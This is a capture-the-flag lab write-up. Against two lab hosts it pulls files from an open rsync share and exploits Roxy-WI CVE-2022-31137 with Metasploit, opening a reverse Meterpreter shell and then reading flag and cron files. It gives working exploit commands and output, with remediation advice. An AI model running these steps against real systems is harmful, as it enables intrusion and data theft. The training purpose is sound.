# Host & Network Penetration Testing: The Metasploit Framework CTF 2
### Capture The Flag Lab Writeup

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Lab Environment Overview](#2-lab-environment-overview)
3. [Target 1 — Initial Reconnaissance](#3-target-1--initial-reconnaissance)
4. [Flag 1 — RSYNC Banner Inspection](#4-flag-1--rsync-banner-inspection)
5. [Flag 2 — Anonymous RSYNC Share Enumeration and File Retrieval](#5-flag-2--anonymous-rsync-share-enumeration-and-file-retrieval)
6. [Target 2 — Initial Reconnaissance](#6-target-2--initial-reconnaissance)
7. [Flag 3 — Roxy-WI Unauthenticated RCE via Metasploit](#7-flag-3--roxy-wi-unauthenticated-rce-via-metasploit)
8. [Flag 4 — Cron Job Enumeration and Flag Discovery](#8-flag-4--cron-job-enumeration-and-flag-discovery)
9. [Summary of Findings](#9-summary-of-findings)
10. [Conclusions and Lessons Learned](#10-conclusions-and-lessons-learned)

---

## 1. Introduction

This report documents the methodology, tools, and findings from a Capture The Flag (CTF) lab exercise titled **Host & Network Penetration Testing: The Metasploit Framework CTF 2**, completed as part of a structured penetration testing curriculum. The lab comprised two Linux target machines, each hosting two flags, requiring distinct exploitation techniques across different services and vulnerability classes.

**Target 1** exposed an RSYNC service on a non-standard-yet-common port, which allowed anonymous module listing and unauthenticated file retrieval — yielding both flags through passive inspection and file download.

**Target 2** hosted a vulnerable installation of **Roxy-WI**, a web-based HAProxy and Nginx management interface, affected by an unauthenticated command injection vulnerability (CVE-2022-31137). Exploitation via Metasploit produced a Meterpreter shell, from which a fourth flag was discovered embedded within a cron job definition.

The techniques exercised in this lab include:

- **Port scanning** using Metasploit's TCP scanner module
- **RSYNC service enumeration** via banner inspection and module listing
- **Anonymous RSYNC file retrieval** and local content analysis
- **Web application fingerprinting** and vulnerability identification
- **Unauthenticated RCE exploitation** of Roxy-WI via the Metasploit `roxy_wi_exec` module
- **Post-exploitation cron job enumeration** for privilege and flag discovery

All activities were performed within an isolated, authorised lab environment. No live or production systems were involved.

---

## 2. Lab Environment Overview

| Parameter          | Details                              |
|--------------------|--------------------------------------|
| Attacker Machine   | Kali Linux (GUI access provided)     |
| Target 1 Hostname  | `target1.ine.local`                  |
| Target 2 Hostname  | `target2.ine.local`                  |
| Attacker IP        | `192.195.212.2`                      |
| Target 1 IP        | `192.195.212.3`                      |
| Target 2 IP        | `192.195.212.4`                      |

### Tools Used

| Tool                       | Purpose                                                           |
|----------------------------|-------------------------------------------------------------------|
| Metasploit `scanner/portscan/tcp` | TCP port scanning for Target 1                           |
| `rsync`                    | RSYNC banner inspection, module listing, and file retrieval       |
| `nmap`                     | Service version detection and script scanning on Target 2         |
| Metasploit `roxy_wi_exec`  | Unauthenticated RCE exploitation of Roxy-WI on Target 2          |
| Meterpreter                | Post-exploitation shell, filesystem and cron job enumeration      |

### Objectives

| Flag   | Target   | Hint                                                                               |
|--------|----------|------------------------------------------------------------------------------------|
| Flag 1 | Target 1 | Enumerate the open port using Metasploit and inspect the RSYNC banner closely.     |
| Flag 2 | Target 1 | The files on the RSYNC server hold valuable information — explore them.            |
| Flag 3 | Target 2 | Exploit the webapp using Metasploit to gain a shell.                               |
| Flag 4 | Target 2 | Automated tasks can leave clues — investigate scheduled jobs or running processes. |

---

## 3. Target 1 — Initial Reconnaissance

Port scanning for Target 1 was performed using the Metasploit TCP port scanner module rather than Nmap, as directed by the lab objective.

### Setup

```
msf6 > service postgresql start
msf6 > msfconsole -q
msf6 > search type:auxiliary name:port scanner
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS target1.ine.local
msf6 auxiliary(scanner/portscan/tcp) > run
```

### Results

```
[+] 192.195.212.3:873 - TCP OPEN
```

### Analysis

A single open port was identified: **port 873**, the default port for the **RSYNC** protocol. RSYNC is a fast file synchronisation and transfer utility widely used in Linux environments for backups and file distribution. When misconfigured, RSYNC can expose file shares to anonymous access without requiring authentication — making it a high-value target for data exfiltration in penetration testing engagements.

---

## 4. Flag 1 — RSYNC Banner Inspection

### Hint

> *"Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting."*

### Methodology

RSYNC servers present a module listing when queried at the protocol level — analogous to an SMB share listing or an FTP directory enumeration. Connecting to the RSYNC service with the `rsync://` URI scheme and specifying only the hostname (without a module path) causes the server to return its list of available modules along with any configured descriptions. The hint indicated that the banner itself — specifically the module listing — contained the first flag.

### Command Used

```bash
rsync rsync://target1.ine.local
```

### Output

```
backupwscohen    FLAG1_{######################################}
```

The module listing returned a single RSYNC module named `backupwscohen`, with its description field populated with the flag value. RSYNC module descriptions are configured in `/etc/rsyncd.conf` and are freely visible to any client that can reach the RSYNC port, regardless of whether the module itself requires authentication.

### Analysis

Embedding sensitive data — or in a real-world context, any descriptive text — in an RSYNC module's `comment` field is a misconfiguration analogous to the SSH or FTP banner disclosure issues seen in prior labs. The module listing is returned without authentication, meaning any network-accessible RSYNC service exposes its module names and descriptions to unauthenticated clients. In a production environment, module names should not reveal the nature of the data they contain, and descriptions should carry only generic labels. The module name `backupwscohen` itself suggests a personal backup share — a common source of sensitive data leakage in enterprise environments where RSYNC is used for ad-hoc file transfers.

### Flag Captured

```
FLAG1_{######################################}
```

---

## 5. Flag 2 — Anonymous RSYNC Share Enumeration and File Retrieval

### Hint

> *"The files on the RSYNC server hold valuable information. Explore the contents to find the flag."*

### Methodology

Having identified the module `backupwscohen` from the banner, the next step was to enumerate its contents by querying the module directly. RSYNC allows clients to list files within a module before downloading, provided the module is not access-restricted. The module was first listed, then all of its contents were downloaded recursively to a local staging directory for analysis.

### Step 1: List the Module Contents

```bash
rsync rsync://target1.ine.local/backupwscohen
```

**Output:**

```
drwxr-xr-x    4,096 2026/06/26 18:41:14 .
-rw-r--r--       20 2024/10/28 15:05:40 TPSData.txt
-rw-r--r--       25 2024/10/28 15:05:40 office_staff.vhd
-rw-r--r--       39 2026/06/26 18:41:14 pii_data.xlsx
```

Three files were present in the module: `TPSData.txt`, `office_staff.vhd`, and `pii_data.xlsx`. The filenames are notable in a real-world assessment context — `office_staff.vhd` suggests a virtual hard disk image potentially containing user data, and `pii_data.xlsx` explicitly references personally identifiable information.

### Step 2: Download All Files

The `-av` flags (archive mode with verbose output) were used to recursively download the full module contents to a local directory:

```bash
rsync -av rsync://target1.ine.local/backupwscohen /root/rsync/
```

**Output:**

```
receiving incremental file list
created directory /root/rsync
./
TPSData.txt
office_staff.vhd
pii_data.xlsx

sent 84 bytes  received 341 bytes  850.00 bytes/sec
total size is 84  speedup is 0.20
```

### Step 3: Inspect File Contents

All three files were read in sequence:

```bash
cat /root/rsync/backupwscohen/*
```

**Output:**

```
Sample office staff data
FLAG2_{######################################}
Sample data for TPS
```

The flag was embedded as the full contents of `pii_data.xlsx`. The other two files contained placeholder text confirming them as lab artefacts.

### Analysis

The `backupwscohen` RSYNC module required no credentials, allowing any client to list and download its contents without any form of authentication. This is a common misconfiguration in environments where RSYNC is deployed for convenience without hardening — the `hosts allow`, `auth users`, and `secrets file` directives in `rsyncd.conf` are frequently left unconfigured. In a real-world scenario, the three files present in this module represent a significant data exposure: a virtual hard disk image, a spreadsheet labelled as containing PII, and an internal data file — all downloadable by an unauthenticated remote attacker. RSYNC modules should always require authentication and, where possible, restrict access by IP range using the `hosts allow` directive.

### Flag Captured

```
FLAG2_{######################################}
```

---

## 6. Target 2 — Initial Reconnaissance

A full TCP port scan with service version detection and default script execution was performed against Target 2.

### Command Used

```bash
nmap -sV -sC -p- target2.ine.local
```

### Results

```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Roxy-WI
443/tcp open  ssl/http Apache httpd 2.4.52
|_http-title: Roxy-WI
| ssl-cert: Subject: commonName=*.roxy-wi.org
| Not valid before: 2022-07-29T05:20:44
|_Not valid after:  2050-12-14T05:20:44
Service Info: Host: roxy-wi.example.com
```

### Analysis

Target 2 exposed a web server on both HTTP (port 80) and HTTPS (port 443), with both services identifying as **Roxy-WI** via the HTTP title and the SSL certificate's common name (`*.roxy-wi.org`). Roxy-WI is an open-source web interface for managing HAProxy, Nginx, Keepalived, and Grafana services. Navigating to `http://target2.ine.local` confirmed the application identity and triggered a redirect to `/app/overview.py`, which initiated a file download — indicating an application misconfiguration rather than a standard web login flow.

Further manual inspection of the `/app/` path revealed a fully browseable directory listing containing the application's Python source files, configuration files, and a SQLite database (`roxy-wi.db`). While the exposed source code was noted as a significant finding, the hint directed focus toward Metasploit — suggesting a known, documented exploit was the intended attack path.

---

## 7. Flag 3 — Roxy-WI Unauthenticated RCE via Metasploit

### Hint

> *"Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local."*

### Methodology

A Metasploit search for Roxy-WI returned a relevant exploitation module corresponding to **CVE-2022-31137**, a critical unauthenticated command injection vulnerability affecting Roxy-WI versions prior to 6.1.1.0. The vulnerability exists in the application's handling of user-supplied input that is passed unsanitised to operating system commands, allowing a remote attacker to inject arbitrary shell commands without any prior authentication.

### Step 1: Identify the Exploitation Module

```
msf6 > search Roxy-WI
```

**Output:**

```
#  Name                             Disclosure Date  Rank       Check  Description
-  ----                             ---------------  ----       -----  -----------
0  exploit/linux/http/roxy_wi_exec  2022-07-06       excellent  Yes    Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE
1    \_ target: Unix (In-Memory)    .                .          .      .
2    \_ target: Linux (Dropper)     .                .          .      .
```

### Step 2: Configure and Execute the Exploit

```
msf6 > use exploit/linux/http/roxy_wi_exec
msf6 exploit(linux/http/roxy_wi_exec) > set RHOSTS target2.ine.local
msf6 exploit(linux/http/roxy_wi_exec) > set LHOST eth1
msf6 exploit(linux/http/roxy_wi_exec) > run
```

**Output:**

```
[*] Started reverse TCP handler on 192.195.212.2:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.195.212.4:443 is vulnerable!
[+] The target is vulnerable. The device responded to exploitation with a 200 OK and test command successfully executed.
[*] Exploiting...
[*] Sending stage (24772 bytes) to 192.195.212.4
[*] Meterpreter session 1 opened (192.195.212.2:4444 -> 192.195.212.4:55126)
```

The module's automatic vulnerability check confirmed the target was exploitable before proceeding, then delivered the Meterpreter stage successfully. System information was retrieved to characterise the compromised host:

```
meterpreter > sysinfo
Computer     : target2.ine.local
OS           : Linux 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC
Architecture : x64
Meterpreter  : python/linux

meterpreter > getuid
Server username: www-data
```

The shell was executing in the context of the `www-data` Apache service account.

### Step 3: Enumerate the Filesystem Root and Retrieve Flag 3

A shell was spawned from the Meterpreter session and the filesystem root was enumerated:

```bash
ls /
```

**Relevant Output:**

```
bin  boot  dev  etc  flag.txt  home  lib  lib32  lib64
libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

```bash
cat /flag.txt
FLAG3_{######################################}
```

The flag was placed directly in the filesystem root, accessible to the `www-data` service account.

### Analysis

CVE-2022-31137 is a critical severity (CVSS 9.8) unauthenticated remote code execution vulnerability. The absence of any authentication requirement means that any network-accessible instance of a vulnerable Roxy-WI version is immediately exploitable by any attacker who can reach port 80 or 443. The Metasploit module's automatic vulnerability check — using a benign test command before deploying the payload — is a useful feature that prevents unnecessary exploitation attempts against non-vulnerable targets. The exposed `/app/` directory listing also represents a secondary vulnerability: the application's Python source code and SQLite database were publicly readable, potentially revealing additional attack vectors independently of the CVE.

### Flag Captured

```
FLAG3_{######################################}
```

---

## 8. Flag 4 — Cron Job Enumeration and Flag Discovery

### Hint

> *"Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag."*

### Methodology

The hint pointed toward scheduled tasks as the location of the final flag. On Linux systems, cron jobs are defined in several locations: the user-specific `crontab` (editable via `crontab -l`), the system-wide `/etc/crontab` file, and per-application or per-package drop-in files within `/etc/cron.d/`. Standard enumeration of these locations was performed from within the active shell.

### Step 1: Attempt Standard crontab Enumeration

```bash
crontab -l
```

**Output:**

```
bash: crontab: command not found
```

The `crontab` binary was not available in the shell's PATH within the compromised environment.

```bash
cat /etc/crontab
```

**Output:**

```
cat: /etc/crontab: No such file or directory
```

The system-wide `crontab` file did not exist, indicating that scheduled tasks on this system were managed exclusively through drop-in files.

### Step 2: Enumerate /etc/cron.d/

The `/etc/cron.d/` directory was identified during manual enumeration of `/etc/` and was found to contain multiple cron job definition files:

```bash
cat /etc/cron.d/*
```

**Output:**

```
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
* * * * * www-data echo "FLAG4_{#######################################}"
```

The third cron entry was immediately distinctive: a job scheduled to run **every minute** (`* * * * *`), executing as the `www-data` user, with the sole command being `echo` of the flag value.

### Analysis

The flag was encoded directly within a cron job's command field — a realistic representation of how sensitive values such as secrets, API keys, or credentials can be inadvertently committed to cron configurations in production environments. Cron job files in `/etc/cron.d/` are typically readable by all users on the system (world-readable by default), meaning any local user — or, as in this case, a compromised web service account — can read their contents without requiring elevated privileges. The fact that the `crontab` binary was absent and `/etc/crontab` did not exist made systematic enumeration of the `/etc/` directory structure the necessary fallback — reinforcing the importance of thorough post-exploitation filesystem enumeration rather than relying solely on standard enumeration commands.

### Flag Captured

```
FLAG4_{######################################}
```

---

## 9. Summary of Findings

| Flag   | Target   | Service         | Port | Discovery Technique                              | Key Vulnerability                                   | Risk     |
|--------|----------|-----------------|------|--------------------------------------------------|-----------------------------------------------------|----------|
| Flag 1 | Target 1 | RSYNC           | 873  | RSYNC module listing (banner)                    | Flag embedded in RSYNC module description field     | Medium   |
| Flag 2 | Target 1 | RSYNC           | 873  | Anonymous RSYNC file retrieval                   | Unauthenticated RSYNC module with sensitive files   | Critical |
| Flag 3 | Target 2 | HTTP/HTTPS      | 443  | Roxy-WI RCE exploit (CVE-2022-31137)             | Unauthenticated command injection in Roxy-WI <6.1.1.0 | Critical |
| Flag 4 | Target 2 | Filesystem/Cron | —    | `/etc/cron.d/` enumeration                       | Sensitive value embedded in world-readable cron job | High     |

### Vulnerabilities Identified

1. **Unauthenticated RSYNC Module Access (Target 1 — Critical)** — The `backupwscohen` RSYNC module required no credentials, allowing any network-accessible client to list and download its contents. The module contained files with names explicitly referencing PII and office staff data, representing a significant data exposure risk independent of the flag.

2. **Sensitive Data in RSYNC Module Description (Target 1 — Medium)** — The RSYNC module's description field, visible to unauthenticated clients via the banner listing, contained the flag value. In production deployments, module descriptions should be generic and contain no operational or sensitive information.

3. **Roxy-WI Unauthenticated RCE — CVE-2022-31137 (Target 2 — Critical)** — Roxy-WI version prior to 6.1.1.0 was deployed with no authentication bypass mitigations, allowing a remote attacker to achieve operating system command injection without credentials. CVSS score: 9.8 (Critical).

4. **Exposed Web Application Source Code and Database (Target 2 — High)** — The `/app/` directory was publicly browseable, exposing the full Python source code of the Roxy-WI application, its configuration files, and a SQLite database (`roxy-wi.db`). The database likely contains user credentials and application configuration data.

5. **Sensitive Data in Cron Job Definition (Target 2 — High)** — A world-readable cron job file in `/etc/cron.d/` contained the flag value as a literal `echo` command argument. In production environments, this pattern is analogous to credentials, API keys, or secrets being embedded directly in scheduled task definitions — a common and frequently overlooked data exposure vector.

---

## 10. Conclusions and Lessons Learned

This lab demonstrated two independently exploitable targets, each requiring a different mindset: Target 1 was an unauthenticated data exposure scenario requiring no exploitation beyond standard protocol enumeration, while Target 2 involved an active web application vulnerability leading to remote code execution and post-exploitation discovery. Together, they illustrate that critical findings in a penetration test arise both from misconfigured services and from unpatched software vulnerabilities.

### Attack Chain Summary

```
Target 1
────────
Metasploit TCP Scanner → port 873 (RSYNC) identified
    └─► rsync rsync://target1.ine.local → module listing
            └─► backupwscohen description = FLAG 1

rsync rsync://target1.ine.local/backupwscohen → files listed
    └─► rsync -av → all files downloaded to /root/rsync/
            └─► cat * → pii_data.xlsx = FLAG 2

Target 2
────────
Nmap -sV -sC → Apache 2.4.52 + Roxy-WI on ports 80/443
    └─► search Roxy-WI → exploit/linux/http/roxy_wi_exec (CVE-2022-31137)
            └─► set RHOSTS + LHOST → run → Meterpreter (www-data)
                    └─► shell → cat /flag.txt → FLAG 3

meterpreter shell → /etc/cron.d/ enumeration
    └─► cat /etc/cron.d/* → www-data echo "FLAG4_..." cron entry
            └─► FLAG 4
```

### Key Takeaways

- **RSYNC services must always require authentication.** The `auth users` and `secrets file` directives in `rsyncd.conf` should be configured for every module, and access should be further restricted by IP range using `hosts allow`. An unauthenticated RSYNC module accessible from a network is effectively a publicly readable file server.

- **RSYNC module descriptions are publicly visible without authentication.** Any text placed in the `comment` field of an `rsyncd.conf` module entry is returned to all clients during the module listing phase — before any authentication occurs. These fields must never contain operational details, credentials, or sensitive identifiers.

- **Web applications must be kept patched and up to date.** CVE-2022-31137 was disclosed in July 2022 and patched in Roxy-WI 6.1.1.0 shortly thereafter. A vulnerable version of Roxy-WI exposed on a public-facing port with no mitigating controls represents a trivially exploitable critical severity vulnerability. Version management and patch tracking are non-negotiable security controls for any internet-accessible application.

- **Web application source directories must not be browseable.** The Apache `Options -Indexes` directive must be set globally, and the `/app/` directory should not be served from within the web root at all. Application source code, configuration files, and databases must reside outside the document root or be protected by explicit `Deny` rules.

- **Cron job files are world-readable and must never contain secrets.** Credentials, API keys, tokens, and any sensitive values should be stored in dedicated secrets management systems (HashiCorp Vault, AWS Secrets Manager, environment files with restricted permissions) and referenced by cron jobs indirectly — never embedded as literal values in cron command strings.

- **Post-exploitation enumeration must account for non-standard configurations.** The absence of the `crontab` binary and the `/etc/crontab` file would have ended a less thorough investigation prematurely. Manual enumeration of the `/etc/cron.d/` drop-in directory was required to discover the flag — reinforcing that automated enumeration scripts and standard commands are starting points, not complete solutions.

---

*Report completed: June 26, 2026*
*Lab: Host & Network Penetration Testing: The Metasploit Framework CTF 2*
*Platform: INE Security / eLearnSecurity*
